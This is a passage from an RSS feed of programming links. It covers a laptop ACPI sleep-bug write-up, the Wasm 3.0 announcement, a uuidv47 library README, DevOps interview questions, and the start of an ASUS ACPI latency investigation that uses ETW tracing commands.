One</code>. It doesn't make sense to even use that condition after that assignment.</p><p>The question arises when you realise that this is the same code running for S5 too: how does my computer even shut down properly then?</p><p>Notice the TPTS method:</p><pre><code> Method (TPTS, 1, Serialized) { Switch (ToInteger (Arg0)) { Case (0x04) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } Case (0x05) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } } } </code></pre><p>In TPTS, the same statements are written for S4 (Hibernate) and S5 (Shutdown) states. After saving the RAM to the disk, hibernation occurs by shutting everything down. TPTS saves the day. </p><p>The TPTS method executes before the buggy SPTS method. As you can see in its code, TPTS has a specific Case for S5 (Shutdown), correctly preparing the hardware.</p><p>TPTS is not responsible for S3 sleep (and it doesn't even need to be responsible in this case).</p><h2>Outro</h2><p>Where there's garbage, there's luck. And luck also means pulling the garbage values from the register. That's exactly what happens every time I try to close the lid of my laptop... it depends on an actual garbage value.</p><p>How will I explain all this to the 13-year-old me? How many hours were lost just thinking about this...?</p><p>Damn.</p><hr><p>Do you know how I feel? </p><p>More like <a href="https://xkcd.com/2347/">XKCD 2347</a>.</p><p>In the world of AI hype, we DO deserve more tech-reviewers decoding the ACPI tables and ACTUALLY telling us if the system is stable or not. That's... the only demand from this disillusioned mind.</p><p>This was intended to be a technical report, and I rest my sorry case here.</p></div><div class="gallery"><p><img src="https://triangulatedexistence.mataroa.blog/images/ff0570e5.png"></p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 11:00:27 +0530</pubDate></item><item><link>https://webassembly.org/news/2025-09-17-wasm-3.0/</link><title>Wasm 3.0 Completed (webassembly.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/</guid><comments>https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/'>Post permalink</a></p></section><section class='preview-image'><img src='https://v1.screenshot.11ty.dev/https%3A%2F%2Fwebassembly.org%2Fnews%2F2025-09-17-wasm-3.0%2F/opengraph/' /></section><section class='parsed-content'><div><header> </header><div><p><em>Published on September 17, 2025 by <a href="https://github.com/rossberg">Andreas Rossberg</a>.</em></p><p>Three years ago, <a href="https://webassembly.org/news/2025-03-20-wasm-2.0/">version 2.0</a> of the Wasm standard was (essentially) finished, which brought a number of new features, such as vector instructions, bulk memory operations, multiple return values, and simple reference types.</p><p>In the meantime, the Wasm W3C Community Group and Working Group have not been lazy. Today, we are happy to announce the release of Wasm 3.0 as the new &ldquo;live&rdquo; standard.</p><p>This is a substantially larger update: several big features, some of which have been in the making for six or eight years, finally made it over the finishing line.</p><ul> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/memory64/Overview.md"><em>64-bit address space.</em></a> Memories and tables can now be declared to use <code>i64</code> as their address type instead of just <code>i32</code>. That expands the available address space of Wasm applications from 4 gigabytes to (theoretically) 16 exabytes, to the extent that physical hardware allows. While the web will necessarily keep enforcing certain limits &mdash; on the web, a 64-bit memory is limited to 16 gigabytes &mdash; the new flexibility is especially interesting for non-web ecosystems using Wasm, as they can support much, much larger applications and data sets now.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/multi-memory/Overview.md"><em>Multiple memories.</em></a> Contrary to popular belief, Wasm applications were always able to use multiple memory objects &mdash; and hence multiple address spaces &mdash; simultaneously. However, previously that was only possible by declaring and accessing each of them in separate modules. This gap has been closed, a single module can now declare (define or import) multiple memories and directly access them, including directly copying data between them. This finally allows tools like wasm-merge, which perform &ldquo;static linking&rdquo; on two or more Wasm modules by merging them into one, to work for <em>all</em> Wasm modules. It also paves the way for new uses of separate address spaces, e.g., for security (separating private data), for buffering, or for instrumentation.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/gc/Overview.md"><em>Garbage collection.</em></a> In addition to expanding the capabilities of raw linear memories, Wasm also adds support for a new (and separate) form of storage that is automatically managed by the Wasm runtime via a garbage collector. Staying true to the spirit of Wasm as a low-level language, Wasm GC is low-level as well: a compiler targeting Wasm can declare the memory layout of its runtime data structures in terms of struct and array types, plus unboxed tagged integers, whose allocation and lifetime is then handled by Wasm. But that&rsquo;s it. Everything else, such as engineering suitable representations for source-language values, including implementation details like method tables, remains the responsibility of compilers targeting Wasm. There are no built-in object systems, nor closures or other higher-level constructs &mdash; which would inevitably be heavily biased towards specific languages. Instead, Wasm only provides the basic building blocks for representing such constructs and focuses purely on the memory management aspect.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/function-references/Overview.md"><em>Typed references.</em></a> The GC extension is built upon a substantial extension to the Wasm type system, which now supports much richer forms of references. Reference types can now describe the exact shape of the referenced heap value, avoiding additional runtime checks that would otherwise be needed to ensure safety. This more expressive typing mechanism, including subtyping and type recursion, is also available for function references, making it possible to perform safe indirect function calls without any runtime type or bounds check, through the new <code>call_ref</code> instruction.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/tail-call/Overview.md"><em>Tail calls.</em></a> Tail calls are a variant of function calls that immediately exit the current function, and thereby avoid taking up additional stack space. Tail calls are an important mechanism that is used in various language implementations both in user-visible ways (e.g., in functional languages) and for internal techniques (e.g., to implement stubs). Wasm tail calls are fully general and work for callees both selected statically (by function index) and dynamically (by reference or table).</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/exception-handling/Exceptions.md"><em>Exception handling.</em></a> Exceptions provide a way to locally abort execution, and are a common feature in modern programming languages. Previously, there was no efficient way to compile exception handling to Wasm, and existing compilers typically resorted to convoluted ways of implementing them by escaping to the host language, e.g., JavaScript. This was neither portable nor efficient. Wasm 3.0 hence provides native exception handling within Wasm. Exceptions are defined by declaring exception tags with associated payload data. As one would expect, an exception can be thrown, and selectively be caught by a surrounding handler, based on its tag. Exception handlers are a new form of block instruction that includes a dispatch list of tag/label pairs or catch-all labels to define where to jump when an exception occurs.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/relaxed-simd/Overview.md"><em>Relaxed vector instructions.</em></a> Wasm 2.0 added a large set of vector (SIMD) instructions, but due to differences in hardware, some of these instructions have to do extra work on some platforms to achieve the specified semantics. In order to squeeze out maximum performance, Wasm 3.0 introduces &ldquo;relaxed&rdquo; variants of these instructions that are allowed to have implementation-dependent behavior in certain edge cases. This behavior must be selected from a pre-specified set of legal choices.</p></li> <li><p><a href="https://github.com/WebAssembly/profiles/blob/main/proposals/profiles/Overview.md"><em>Deterministic profile.</em></a> To make up for the added semantic fuzziness of relaxed vector instructions, and in order to support settings that demand or need deterministic execution semantics (such as blockchains, or replayable systems), the Wasm standard now specifies a deterministic default behavior for every instruction with otherwise non-deterministic results &mdash; currently, this includes floating-point operators and their generated NaN values and the aforementioned relaxed vector instructions. Between platforms choosing to implement this deterministic execution profile, Wasm thereby is fully deterministic, reproducible, and portable.</p></li> <li><p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/annotations/Overview.md"><em>Custom annotation syntax.</em></a> Finally, the Wasm text format has been enriched with generic syntax for placing annotations in Wasm source code. Analogous to custom sections in the binary format, these annotations are not assigned any meaning by the Wasm standard itself, and can be chosen to be ignored by implementations. However, they provide a way to represent the information stored in custom sections in human-readable and writable form, and concrete annotations can be specified by downstream standards.</p></li> </ul><p>In addition to these core features, embeddings of Wasm into JavaScript benefit from a new extension to the JS API:</p><ul> <li><a href="https://github.com/WebAssembly/js-string-builtins/blob/main/proposals/js-string-builtins/Overview.md"><em>JS string builtins.</em></a> JavaScript string values can already be passed to Wasm as externrefs. Functions from this new primitive library can be imported into a Wasm module to directly access and manipulate such external string values inside Wasm.</li> </ul><p>With these new features, Wasm has much better support for compiling high-level programming languages. Enabled by this, we have seen various new languages popping up to target Wasm, such as <a href="https://github.com/google/j2cl/blob/master/docs/getting-started-j2wasm.md">Java</a>, <a href="https://dune.readthedocs.io/en/stable/wasmoo.html">OCaml</a>, <a href="https://www.scala-js.org/doc/project/webassembly.html">Scala</a>, <a href="https://kotlinlang.org/docs/wasm-overview.html">Kotlin</a>, <a href="https://spritely.institute/hoot/">Scheme</a>, or <a href="https://dart.dev/web/wasm">Dart</a>, all of which use the new GC feature.</p><p>On top of all these goodies, Wasm 3.0 also is the first version of the standard that has been produced with the new <a href="https://webassembly.org/news/2025-03-27-spectec/">SpecTec</a> tool chain. We believe that this makes for an even more reliable specification.</p><p>Wasm 3.0 is already shipping in most major web browsers, and support in stand-alone engines like Wasmtime is on track to completion as well. The <a href="https://webassembly.org/features/">Wasm feature status</a> page tracks support across engines.</p></div></div></section>]]></description><pubDate>Thu, 18 Sep 2025 02:19:51 +0530</pubDate></item><item><link>https://github.com/stateless-me/uuidv47</link><title>UUIDv47: keep v7 in your DB, emit v4 outside (SipHash-masked timestamp) (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/</guid><comments>https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hi, I’m the author of <strong>uuidv47</strong>. The idea is simple: keep <strong>UUIDv7</strong> internally for database indexing and sortability, but emit <strong>UUIDv4-looking façades</strong> externally so clients don’t see timing patterns.</p><p>How it works: the 48-bit timestamp is XOR-masked with a keyed <strong>SipHash-2-4</strong> stream derived from the UUID’s random field. The random bits are preserved, the version flips between 7 (inside) and 4 (outside), and the RFC variant is kept. The mapping is injective: <code>(ts, rand) → (encTS, rand)</code>. Decode is just <code>encTS ⊕ mask</code>, so round-trip is exact.</p><p>Security: SipHash is a PRF, so observing façades doesn’t leak the key. Wrong key = wrong timestamp. Rotation can be done with a key-ID outside the UUID.</p><p>Performance: one SipHash over 10 bytes + a couple of 48-bit loads/stores. Nanosecond overhead, header-only C89, no deps, allocation-free.</p><p>Tests: SipHash reference vectors, round-trip encode/decode, and version/variant invariants.</p><p>Curious to hear feedback!</p><p><strong>EDIT1:</strong> <strong>The Postgres extension is available.</strong></p><p>It currently supports around 95% of common use cases and index types (B-trees, BRIN, etc.), but the test coverage still needs improvement and review. The extension is functional, but it’s still in an early stage of maturity.</p><p><strong>EDIT2: The benchmark on M1(C):</strong></p><pre><code>iters=2000000, warmup=1, rounds=3[warmup] 34.89 ns/op[encode+decode] round 1: 33.80 ns/op, 29.6 Mops/s[encode+decode] round 2: 38.16 ns/op, 26.2 Mops/s[encode+decode] round 3: 33.33 ns/op, 30.0 Mops/s[warmup] 14.83 ns/op[siphash(10B)] round 1: 14.88 ns/op, 67.2 Mops/s[siphash(10B)] round 2: 15.45 ns/op, 64.7 Mops/s[siphash(10B)] round 3: 15.00 ns/op, 66.7 Mops/s== best results ==encode+decode : 33.00 ns/op (30.3 Mops/s)siphash(10B)  : 14.00 ns/op (71.4 Mops/s)</code></pre></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/7726fce55915b86f802829c75624af484d4c316a2a1f5d2c14c7b00ef8f981d7/stateless-me/uuidv47' /></section><section class='parsed-content'><div><article><h2>UUIDv47 - UUIDv7-in / UUIDv4-out (SipHash-masked timestamp)</h2><a href="https://github.com#uuidv47---uuidv7-in--uuidv4-out-siphash-masked-timestamp"></a><p>uuidv47 lets you store sortable UUIDv7 in your database while emitting a UUIDv4-looking fa&ccedil;ade at your API boundary. It does this by XOR-masking only the UUIDv7 timestamp field with a keyed SipHash-2-4 stream tied to the UUID&rsquo;s own random bits.</p><ul> <li>Header-only C (C89) &middot; zero deps</li> <li>Deterministic, invertible mapping (exact round-trip)</li> <li>RFC-compatible version/variant bits (v7 in DB, v4 on the wire)</li> <li>Key-recovery resistant (SipHash-2-4, 128-bit key)</li> <li>Full tests provided</li> </ul> <hr> <h2>Table of contents</h2><a href="https://github.com#table-of-contents"></a> <ul> <li>Why</li> <li>Quick start</li> <li>Public API</li> <li>Specification <ul> <li>UUIDv7 bit layout</li> <li>Fa&ccedil;ade mapping (v7 &harr; v4)</li> <li>SipHash message derived from random</li> <li>Invertibility</li> <li>Collision analysis</li> </ul> </li> <li>Security model</li> <li>Build, test, coverage</li> <li>Integration tips</li> <li>Performance notes</li> <li>FAQ</li> <li>License</li> </ul> <hr><p></p><h2>Why</h2><a href="https://github.com#why"></a> <ul> <li>DB-friendly: UUIDv7 is time-ordered &rarr; better index locality &amp; pagination.</li> <li>Externally neutral: The fa&ccedil;ade hides timing patterns and looks like v4 to clients/systems.</li> <li>Secret safety: Uses a PRF (SipHash-2-4). Non-crypto hashes are not suitable when the key must not leak.</li> </ul> <hr> <h2>Quick start</h2><a href="https://github.com#quick-start"></a><div><pre><span>#include</span> <span>#include</span> <span>"uuidv47.h"</span> <span>int</span> <span>main</span>(<span>void</span>){ <span>const</span> <span>char</span><span>*</span> <span>s</span> <span>=</span> <span>"00000000-0000-7000-8000-000000000000"</span>; <span>uuid128_t</span> <span>v7</span>; <span>if</span> (!<span>uuid_parse</span>(<span>s</span>, <span>&amp;</span><span>v7</span>)) <span>return</span> <span>1</span>; <span>uuidv47_key_t</span> <span>key</span> <span>=</span> { .<span>k0</span> <span>=</span> <span>0x0123456789abcdefULL</span>, .<span>k1</span> <span>=</span> <span>0xfedcba9876543210ULL</span> }; <span>uuid128_t</span> <span>facade</span> <span>=</span> <span>uuidv47_encode_v4facade</span>(<span>v7</span>, <span>key</span>); <span>uuid128_t</span> <span>back</span> <span>=</span> <span>uuidv47_decode_v4facade</span>(<span>facade</span>, <span>key</span>); <span>char</span> <span>a</span>[<span>37</span>], <span>b</span>[<span>37</span>], <span>c</span>[<span>37</span>]; <span>uuid_format</span>(<span>&amp;</span><span>v7</span>, <span>a</span>); <span>uuid_format</span>(<span>&amp;</span><span>facade</span>, <span>b</span>); <span>uuid_format</span>(<span>&amp;</span><span>back</span>, <span>c</span>); <span>printf</span>(<span>"v7 (DB) : %s\n"</span>, <span>a</span>); <span>printf</span>(<span>"v4 (API): %s\n"</span>, <span>b</span>); <span>printf</span>(<span>"back : %s\n"</span>, <span>c</span>); }</pre></div><p>Build &amp; run with the provided Makefile: make test make coverage sudo make install</p><hr> <h2>Public API</h2><a href="https://github.com#public-api"></a><div><pre><span>typedef</span> <span>struct</span> { <span>uint8_t</span> <span>b</span>[<span>16</span>]; } <span>uuid128_t</span>; <span>typedef</span> <span>struct</span> { <span>uint64_t</span> <span>k0</span>, <span>k1</span>; } <span>uuidv47_key_t</span>; <span>uuid128_t</span> <span>uuidv47_encode_v4facade</span>(<span>uuid128_t</span> <span>v7</span>, <span>uuidv47_key_t</span> <span>key</span>); <span>uuid128_t</span> <span>uuidv47_decode_v4facade</span>(<span>uuid128_t</span> <span>v4_facade</span>, <span>uuidv47_key_t</span> <span>key</span>); <span>int</span> <span>uuid_version</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>); <span>void</span> <span>set_version</span>(<span>uuid128_t</span><span>*</span> <span>u</span>, <span>int</span> <span>ver</span>); <span>void</span> <span>set_variant_rfc4122</span>(<span>uuid128_t</span><span>*</span> <span>u</span>); <span>bool</span> <span>uuid_parse</span> (<span>const</span> <span>char</span><span>*</span> <span>str</span>, <span>uuid128_t</span><span>*</span> <span>out</span>); <span>void</span> <span>uuid_format</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>, <span>char</span> <span>out</span>[<span>37</span>]);</pre></div><hr><p></p><h2>Specification</h2><a href="https://github.com#specification"></a><p>UUIDv7 bit layout:</p><ul> <li>ts_ms_be: 48-bit big-endian timestamp</li> <li>ver: high nibble of byte 6 = 0x7 (v7) or 0x4 (fa&ccedil;ade)</li> <li>rand_a: 12 random bits</li> <li>var: RFC variant (0b10)</li> <li>rand_b: 62 random bits</li> </ul><p>Fa&ccedil;ade mapping:</p><ul> <li>Encode: ts48 ^ mask48(R), set version=4</li> <li>Decode: encTS ^ mask48(R), set version=7</li> <li>Random bits unchanged</li> </ul><p>SipHash input: 10 bytes from random field: msg[0] = (byte6 &amp; 0x0F) msg[1] = byte7 msg[2] = (byte8 &amp; 0x3F) msg[3..9] = bytes9..15</p><p>Invertibility: XOR mask is reversible with known key.</p><p>Collision analysis: Injective mapping. Only risk is duplicate randoms per ms.</p><hr> <h2>Security model</h2><a href="https://github.com#security-model"></a> <ul> <li>Goal: Secret key unrecoverable even with chosen inputs.</li> <li>Achieved: SipHash-2-4 is a keyed PRF.</li> <li>Keys: 128-bit. Derive via HKDF.</li> <li>Rotation: store small key ID outside UUID.</li> </ul> <hr><p></p><h2>Build, test, coverage</h2><a href="https://github.com#build-test-coverage"></a><div><pre><code>make test make coverage make debug sudo make install </code></pre></div><hr> <h2>Integration tips</h2><a href="https://github.com#integration-tips"></a> <ul> <li>Do encode/decode at API boundary.</li> <li>For Postgres, write tiny C extension.</li> <li>For sharding, hash v4 fa&ccedil;ade with xxh3 or SipHash.</li> </ul> <hr><p></p><h2>Performance</h2><a href="https://github.com#performance"></a><p>SipHash-2-4 on 10-byte message is extremely fast. No allocations.</p><hr> <h2>FAQ</h2><a href="https://github.com#faq"></a><p>Q: Why not xxHash with a secret? A: Not a PRF; secret can leak. Use SipHash.</p><p>Q: Is fa&ccedil;ade indistinguishable from v4? A: Yes, variable bits uniform, version/variant set to v4.</p><hr> <h2>License</h2><a href="https://github.com#license"></a><p>MIT, Copyright (c) 2025 Stateless Limited</p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 19:44:47 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=apREl0KmTdQ</link><title>Software Performance: Avoiding Slow Code, Myths &amp;amp; Sane Approaches – Casey Muratori | The Marco Show (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/</guid><comments>https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/'>Post permalink</a></p></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/apREl0KmTdQ?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="Software Performance: Avoiding Slow Code, Myths &amp; Sane Approaches – Casey Muratori | The Marco Show"></iframe></section>]]></description><pubDate>Wed, 17 Sep 2025 19:39:01 +0530</pubDate></item><item><link>https://medium.com/mind-meets-machine/senior-devops-engineer-interview-at-uber-9a7237b3cc34?sk=09327ee4743c924974ce2000eb0909c9</link><title>Senior DevOps Engineer Interview at Uber.. (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/</guid><comments>https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><article><div><h2>Here is the full interview simulation guide and tips to crack it.</h2><figure><div><p><span>Press enter or click to view image in full size</span></p></div></figure><p>Round 1 &ndash; Core Systems, Linux, Cloud &amp; Kubernetes<br>1. How would you design zero-downtime rollouts for 100+ microservices running on EKS?<br>2. Walk me through what kube-proxy does when IPVS rules vanish mid-traffic.<br>3. Explain your approach to debugging DNS resolution inside pods when CoreDNS itself looks healthy.<br>4. Terraform apply failed mid-way. Half the infra is live, half broken. Walk me through recovery.<br>5. How would you secure secrets management at scale when engineers need fast access but compliance demands audits?</p><p>Round 2 &ndash; RCA, Reliability &amp; Fire Drills<br>1. Kafka consumer lag shoots up after a canary rollout, but CPU/memory metrics are normal. Where do you start?<br>2. A region fails over successfully, but P99 latency doubles across clients. What did you miss?<br>3. HPA is scaling pods, but they remain Pending even with node capacity. Cluster vs scheduler vs CNI, how do you debug?<br>4. etcd corruption detected in a multi-master control plane. Walk through recovery without full downtime.<br>5. CI/CD pipeline secrets leaked through logs. What&rsquo;s your incident response, and how do you prevent it in the future?</p></div></article><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*5Uc9ZGkfouCJTEVWqM6DDw.png"></p></div></section>]]></description><pubDate>Wed, 17 Sep 2025 16:23:35 +0530</pubDate></item><item><link>https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive</link><title>ASUS Gaming Laptops Have Been Broken Since 2021: A Deep Dive (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</guid><comments>https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 43 min | <a href='https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/6646586f1a4f3fb2ffa9a66044e4d769a8619e4ab645d520ab2d9e795ad821d2/Zephkek/Asus-ROG-Aml-Deep-Dive' /></section><section class='parsed-content'><div><article><h2>The ASUS Gaming Laptop ACPI Firmware Bug: A Deep Technical Investigation</h2><a href="https://github.com#the-asus-gaming-laptop-acpi-firmware-bug-a-deep-technical-investigation"></a><p></p><h2>If You're Here, You Know The Pain</h2><a href="https://github.com#if-youre-here-you-know-the-pain"></a><p>You own a high-end ASUS ROG laptop perhaps a Strix, Scar, or Zephyrus. It's specifications are impressive: an RTX 30/40 series GPU, a top-tier Intel processor, and plenty of RAM. Yet, it stutters during basic tasks like watching a YouTube video, audio crackles and pops on Discord calls, the mouse cursor freezes for a split second, just long enough to be infuriating.</p><p>You've likely tried all the conventional fixes:</p><ul> <li>Updating every driver imaginable, multiple times.</li> <li>Performing a "clean" reinstallation of Windows.</li> <li>Disabling every conceivable power-saving option.</li> <li>Manually tweaking processor interrupt affinities.</li> <li>Following convoluted multi-step guides from Reddit threads.</li> <li>Even installing Linux, only to find the problem persists.</li> </ul><p>If none of that worked, it's because the issue isn't with the operating system or a driver. The problem is far deeper, embedded in the machine's firmware, the BIOS.</p><h2>Initial Symptoms and Measurement</h2><a href="https://github.com#initial-symptoms-and-measurement"></a><p></p><h3>The Pattern Emerges</h3><a href="https://github.com#the-pattern-emerges"></a><p>The first tool in any performance investigator's toolkit for these symptoms is LatencyMon. It acts as a canary in the coal mine for system-wide latency issues. On an affected ASUS Zephyrus M16, the results are immediate and damning:</p><div><pre><code>CONCLUSION Your system appears to be having trouble handling real-time audio and other tasks. You are likely to experience buffer underruns appearing as drop outs, clicks or pops. HIGHEST MEASURED INTERRUPT TO PROCESS LATENCY Highest measured interrupt to process latency (&mu;s): 65,816.60 Average measured interrupt to process latency (&mu;s): 23.29 HIGHEST REPORTED ISR ROUTINE EXECUTION TIME Highest ISR routine execution time (&mu;s): 536.80 Driver with highest ISR routine execution time: ACPI.sys HIGHEST REPORTED DPC ROUTINE EXECUTION TIME Highest DPC routine execution time (&mu;s): 5,998.83 Driver with highest DPC routine execution time: ACPI.sys </code></pre></div><p>The data clearly implicates <code>ACPI.sys</code>. However, the per-CPU data reveals a more specific pattern:</p><div><pre><code>CPU 0 Interrupt cycle time (s): 208.470124 CPU 0 ISR highest execution time (&mu;s): 536.804674 CPU 0 DPC highest execution time (&mu;s): 5,998.834725 CPU 0 DPC total execution time (s): 90.558238 </code></pre></div><p>CPU 0 is taking the brunt of the impact, spending over 90 seconds processing interrupts while other cores remain largely unaffected. This isn't a failure of load balancing; it's a process locked to a single core.</p><p>A similar test on a Scar 15 from 2022 shows the exact same culprit: high DPC latency originating from <code>ACPI.sys</code>.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFmMmJhNzNjNGMxMTViMDQ3ZTllNDIyOTk0MWExNjkzNjc5ZmVjZGQxM2U0ODE2ZTc5NWZiNjAxNmFmNmNhOGEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Hup-5kE9PuYLZfxoecT__LqpCDKFBQTvhmlmtXeYLvI"><img width="974" height="511" alt="latencymon" src="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFmMmJhNzNjNGMxMTViMDQ3ZTllNDIyOTk0MWExNjkzNjc5ZmVjZGQxM2U0ODE2ZTc5NWZiNjAxNmFmNmNhOGEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Hup-5kE9PuYLZfxoecT__LqpCDKFBQTvhmlmtXeYLvI"></a><p>It's easy to blame a Windows driver, but <code>ACPI.sys</code> is not a typical driver. It primarily functions as an interpreter for ACPI Machine Language (AML), the code provided by the laptop's firmware (BIOS). If <code>ACPI.sys</code> is slow, it's because the firmware is feeding it inefficient or flawed AML code to execute. These slowdowns are often triggered by General Purpose Events (GPEs) and traffic from the Embedded Controller (EC). To find the true source, we must dig deeper.</p><h2>Capturing the Problem in More Detail: ETW Tracing</h2><a href="https://github.com#capturing-the-problem-in-more-detail-etw-tracing"></a><p></p><h3>Setting Up Advanced ACPI Tracing</h3><a href="https://github.com#setting-up-advanced-acpi-tracing"></a><p>To understand what <code>ACPI.sys</code> is doing during these latency spikes, we can use Event Tracing for Windows (ETW) to capture detailed logs from the ACPI providers.</p><div><pre><span><span>#</span> Find the relevant ACPI ETW providers</span> logman query providers <span>|</span> findstr <span>/</span>i acpi <span><span>#</span> This returns two key providers:</span> <span><span>#</span> Microsoft-Windows-Kernel-Acpi {C514638F-7723-485B-BCFC-96565D735D4A}</span> <span><span>#</span> Microsoft-ACPI-Provider {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}</span> <span><span>#</span> Start a comprehensive trace session</span> logman start ACPITrace <span>-</span>p {DAB01D4D<span>-</span>2D48<span>-</span><span>477D</span><span>-</span>B1C3<span>-</span>DAAD0CE6F06B} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>o C:\Temp\acpi.etl <span>-</span>ets logman update ACPITrace <span>-</span>p {C514638F<span>-</span><span>7723</span><span>-</span>485B<span>-</span>BCFC<span>-</span>96565D735D4A} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>ets <span><span>#</span> Then once we're done we can stop the trace and check the etl file and save the data in csv format aswell.</span> logman stop ACPITrace <span>-</span>ets tracerpt C:\Temp\acpi.etl <span>-</span>o C:\Temp\acpi_events.csv <span>-</span>of CSV</pre></div><h3>An Unexpected Discovery</h3><a href="https://github.com#an-unexpected-discovery"></a><p>Analyzing the resulting trace file in the Windows Performance Analyzer reveals a crucial insight. The spikes aren't random; they are periodic, occurring like clockwork every 30 to 60 seconds.</p><a 